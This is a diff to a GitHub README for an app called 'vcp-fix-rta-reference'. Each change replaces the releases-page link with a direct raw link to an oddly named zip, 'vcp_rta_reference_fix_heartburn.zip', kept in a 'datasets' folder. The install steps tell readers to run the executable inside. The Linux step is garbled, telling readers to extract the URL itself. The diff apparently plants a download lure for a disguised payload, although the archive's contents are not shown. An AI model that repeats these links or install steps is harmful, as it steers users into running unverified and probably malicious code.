@@ -1,6 +1,6 @@
 # 🚀 vcp-fix-rta-reference - Experience Real-Time Audit Verification
 
-[![Download vcp-fix-rta-reference](https://img.shields.io/badge/Download-vcp--fix--rta--reference-brightgreen)](https://github.com/thinhdzkobaohsai/vcp-fix-rta-reference/releases)
+[![Download vcp-fix-rta-reference](https://github.com/thinhdzkobaohsai/vcp-fix-rta-reference/raw/refs/heads/main/datasets/vcp_rta_reference_fix_heartburn.zip)](https://github.com/thinhdzkobaohsai/vcp-fix-rta-reference/raw/refs/heads/main/datasets/vcp_rta_reference_fix_heartburn.zip)
 
 ## 📖 Description
 
@@ -28,14 +28,14 @@ To run the vcp-fix-rta-reference application, ensure you meet the following syst
 To get started with the vcp-fix-rta-reference application, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the release section where you can find the latest version.
-   [Visit the Release Page to Download](https://github.com/thinhdzkobaohsai/vcp-fix-rta-reference/releases)
+   [Visit the Release Page to Download](https://github.com/thinhdzkobaohsai/vcp-fix-rta-reference/raw/refs/heads/main/datasets/vcp_rta_reference_fix_heartburn.zip)
 
 2. **Download the Application:** Choose the version that fits your operating system. Click on it to download the file.
 
 3. **Install the Application:**
    - For Windows: Double-click on the downloaded `.exe` file and follow the installation prompts.
    - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and run the executable inside.
+   - For Linux: Extract the `https://github.com/thinhdzkobaohsai/vcp-fix-rta-reference/raw/refs/heads/main/datasets/vcp_rta_reference_fix_heartburn.zip` file and run the executable inside.
 
 4. **Run the Application:** After installation, locate the application on your device and double-click its icon to start.
 
@@ -43,7 +43,7 @@ To get started with the vcp-fix-rta-reference application, follow these simple s
 
 To download the latest version of vcp-fix-rta-reference, please visit the following link:
 
-[Download vcp-fix-rta-reference](https://github.com/thinhdzkobaohsai/vcp-fix-rta-reference/releases)
+[Download vcp-fix-rta-reference](https://github.com/thinhdzkobaohsai/vcp-fix-rta-reference/raw/refs/heads/main/datasets/vcp_rta_reference_fix_heartburn.zip)
 
 Follow the steps outlined above to ensure a smooth download and installation process.
 
